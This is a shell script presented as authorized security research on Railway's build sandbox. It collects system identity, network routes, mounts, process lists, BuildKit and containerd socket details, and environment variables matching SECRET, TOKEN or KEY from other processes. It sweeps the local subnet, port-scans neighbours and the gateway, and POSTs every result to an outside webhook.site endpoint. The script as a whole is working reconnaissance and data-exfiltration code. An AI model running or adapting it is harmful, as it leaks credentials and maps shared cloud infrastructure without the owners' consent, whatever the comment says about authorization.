#!/bin/sh
# Lane C battery: build-sandbox network topology + BuildKit internals
# Authorized Railway research (ireniumsecurity). Bounded, non-destructive.
TOKEN="31fc19a8-5cfc-44ac-b27f-517fdcb8ffbb"
W="https://webhook.site/$TOKEN"
CAP=60000

exfil() {
  label="$1"; data="$2"
  printf '%s' "###$label### $data" | curl -sS -m 25 -X POST "$W" -H "Content-Type: text/plain" --data-binary @- >/dev/null 2>&1
  echo "exfil:$label done"
}

cap() {
  label="$1"; shift
  out=$("$@" 2>&1 | head -c $CAP)
  exfil "$label" "$out"
}

echo "=== laneC battery start $(date -u +%s) ==="

# ---------- B0: tools + identity ----------
B0="host=$(hostname) fqdn=$(hostname -f 2>&1) uid=$(id 2>&1) date=$(date -u)"
B0="$B0 uname=$(uname -a)"
B0="$B0 osrel=$(cat /etc/os-release 2>/dev/null | tr '\n' '|')"
B0="$B0 machineid=$(cat /etc/machine-id 2>/dev/null)"
B0="$B0 tools=$(for t in ip ss netstat ping nc nslookup dig host traceroute route ifconfig python3 node npm buildctl ctr crictl runc nerdctl bash busybox; do command -v $t 2>/dev/null; done | tr '\n' ',')"
exfil "C0-identity" "$B0"

# ---------- B1: interfaces, routes, dns, arp ----------
B1="=== ip -o addr ===
$(ip -o addr 2>&1)
=== ip route (all) ===
$(ip route show table all 2>&1)
=== ip -6 route (all) ===
$(ip -6 route show table all 2>&1)
=== ifconfig -a ===
$(ifconfig -a 2>&1 | head -c 8000)
=== /proc/net/fib_trie ===
$(cat /proc/net/fib_trie 2>&1 | head -c 12000)
=== /proc/net/route ===
$(cat /proc/net/route 2>&1)
=== /proc/net/ipv6_route ===
$(cat /proc/net/ipv6_route 2>&1 | head -c 4000)
=== resolv.conf ===
$(cat /etc/resolv.conf 2>&1)
=== /etc/hosts ===
$(cat /etc/hosts 2>&1)
=== /etc/hostname ===
$(cat /etc/hostname 2>&1)
=== ip neigh ===
$(ip neigh show 2>&1)
=== /proc/net/arp ===
$(cat /proc/net/arp 2>&1)"
exfil "C1-net" "$B1"

# ---------- B2: process, cgroup, mount ----------
B2="=== /proc/self/cgroup ===
$(cat /proc/self/cgroup 2>&1)
=== /proc/1/cgroup ===
$(cat /proc/1/cgroup 2>&1)
=== /proc/1/cmdline ===
$(tr '\0' ' ' < /proc/1/cmdline 2>&1)
=== /proc/self/uid_map ===
$(cat /proc/self/uid_map 2>&1)
=== ps ===
$(ps aux 2>&1 | head -c 8000)
=== ps -ef ===
$(ps -ef 2>&1 | head -c 8000)
=== proc pids ===
$(ls /proc 2>/dev/null | grep -E '^[0-9]+$' | tr '\n' ' ')
=== /sys/fs/cgroup ===
$(ls -la /sys/fs/cgroup/ 2>&1 | head -c 3000)
=== cgroup.controllers ===
$(cat /sys/fs/cgroup/cgroup.controllers 2>&1)
=== mountinfo ===
$(cat /proc/self/mountinfo 2>&1 | head -c 30000)
=== mounts ===
$(mount 2>&1 | head -c 12000)"
exfil "C2-proc-mount" "$B2"

# ---------- B3: BuildKit internals ----------
B3="=== buildkit env ===
$(env | grep -iE 'buildkit|buildx|docker|containerd|OTEL|RAILWAY' 2>&1 | head -c 8000)
=== sockets /run ===
$(ls -la /run/ /var/run/ 2>&1 | head -c 6000)
=== buildkit paths ===
$(ls -la /run/buildkit /var/run/buildkit /run/containerd /var/run/containerd /run/docker.sock /var/run/docker.sock 2>&1)
=== find socks (maxdepth 4) ===
$(find / -maxdepth 4 \( -name '*.sock' -o -name 'buildkitd*' -o -name 'containerd*' \) 2>/dev/null | head -c 6000)
=== /proc/net/unix ===
$(cat /proc/net/unix 2>&1 | head -c 15000)
=== /proc/net/tcp ===
$(cat /proc/net/tcp 2>&1 | head -c 4000)
=== /proc/net/tcp6 ===
$(cat /proc/net/tcp6 2>&1 | head -c 4000)
=== listening ===
$(ss -tlnp 2>&1 | head -c 6000)
$(netstat -tlnp 2>&1 | head -c 6000)
=== buildkit procs ===
$(ps aux 2>&1 | grep -iE 'buildkit|containerd|runc|mise' | head -c 6000)
=== /proc/self/status ===
$(grep -E 'Cap|Seccomp|NoNewPrivs|NSpid' /proc/self/status 2>&1)
=== /proc/self/mountinfo (buildkit refs) ===
$(grep -iE 'buildkit|container|overlay' /proc/self/mountinfo 2>&1 | head -c 10000)"
exfil "C3-buildkit" "$B3"

# ---------- B3b: sibling processes / namespaces / pid1 root ----------
B3B="=== all pids cmdline ===
$(for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do echo "PID $p: $(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)"; done | head -c 20000)
=== pid1 ns + root ===
$(readlink /proc/1/ns/* 2>&1 | head -c 3000)
$(readlink /proc/1/root /proc/1/exe 2>&1)
$(ls -la /proc/1/root/ 2>&1 | head -c 4000)
$(ls -la /proc/1/root/var/lib/buildkit/ 2>&1 | head -c 4000)
$(ls -la /proc/1/root/run/ 2>&1 | head -c 4000)
=== sampled environs ===
$(for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$' | head -8); do echo "--PID $p--"; tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -iE 'RAILWAY|SECRET|TOKEN|KEY' | head -c 1000; done)"
exfil "C3b-siblings" "$B3B"

# port check helper: bash /dev/tcp preferred, nc fallback
tryport() {
  if command -v bash >/dev/null 2>&1; then
    timeout 2 bash -c "echo > /dev/tcp/$1/$2" 2>/dev/null && echo "OPEN $1:$2"
  else
    nc -z -w2 "$1" "$2" 2>/dev/null && echo "OPEN $1:$2"
  fi
}

# ---------- B4: subnet sweep (own /24 only) ----------
IP4=$(ip -o -4 addr show 2>/dev/null | grep -v '127.0.0.1' | awk '{print $4}' | head -1)
echo "own cidr: $IP4"
: > /tmp/.sweep
if [ -n "$IP4" ]; then
  NET=$(echo "$IP4" | cut -d/ -f1 | cut -d. -f1-3)
  ( for i in $(seq 1 254); do
      ( ping -c1 -W1 "$NET.$i" >/dev/null 2>&1 && echo "UP $NET.$i" ) &
    done; wait ) | sort -t. -k4 -n > /tmp/.sweep
fi
SWEEP=$(cat /tmp/.sweep 2>/dev/null)
UPHOSTS=$(echo "$SWEEP" | awk '{print $2}' | grep -v '^$')
exfil "C4-sweep" "cidr=$IP4
=== up hosts ===
$SWEEP
=== arp after sweep ===
$(ip neigh show 2>&1)
=== proc arp after ===
$(cat /proc/net/arp 2>&1)"

# ---------- B5: port scan of discovered neighbors (bounded) ----------
: > /tmp/.ports
OWN=$(echo "$IP4" | cut -d/ -f1)
for h in $UPHOSTS; do
  [ "$h" = "$OWN" ] && continue
  for p in 22 53 80 443 2375 2376 5000 6443 8080 8443 10250 15432 3000 9090; do
    ( tryport "$h" "$p" >> /tmp/.ports 2>/dev/null ) &
  done
done
wait
exfil "C5-ports" "own=$OWN
=== open ports ===
$(sort /tmp/.ports 2>/dev/null)
=== neigh ===
$(ip neigh show 2>&1)"

# ---------- B6: gateway/L2 detail + traceroute ----------
GW=$(ip route 2>/dev/null | awk '/default/ {print $3}' | head -1)
B6="gateway=$GW
=== ping gw ===
$(ping -c2 -W2 "$GW" 2>&1)
=== traceroute 1.1.1.1 ===
$(traceroute -n -m 6 -w 2 1.1.1.1 2>&1 | head -c 3000)
=== gateway ports ===
"
for p in 22 53 80 443 2375 2376 5000 6443 8080 10250; do
  OPENP=$(tryport "$GW" "$p" 2>/dev/null)
  [ -n "$OPENP" ] && B6="$B6$OPENP
"
done
B6="$B6=== ip link ===
$(ip link 2>&1)
=== ethtool-ish / sys class net ===
$(for i in /sys/class/net/*; do echo \"$i: $(cat $i/address 2>/dev/null) mtu=$(cat $i/mtu 2>/dev/null) oper=$(cat $i/operstate 2>/dev/null)\"; done 2>&1)"
exfil "C6-gateway" "$B6"

echo "=== laneC battery end $(date -u +%s) ==="
